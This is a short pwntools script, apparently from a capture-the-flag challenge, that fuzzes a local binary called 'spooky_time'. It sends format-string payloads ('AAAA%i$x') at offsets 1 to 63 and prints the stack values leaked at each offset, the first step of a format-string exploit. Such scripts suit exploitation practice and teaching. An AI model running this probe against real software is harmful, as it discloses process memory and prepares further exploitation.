from pwn import *

context.clear(arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]

addrs = []

try:
    for i in range(1, 64):
        io = process('./spooky_time')

        io.recv()
        io.sendline(f'AAAA%{i}$x'.encode())
        io.recvuntil(b'than \n')
        addr = io.recvuntil(b'\n')[4:-1]
        addrs.append(addr)
        io.recv() 

        io.shutdown('send')
        io.wait_for_close()
except:
    pass

for i in range(len(addrs)):
    print(f'%{i+1}', '=', addrs[i])

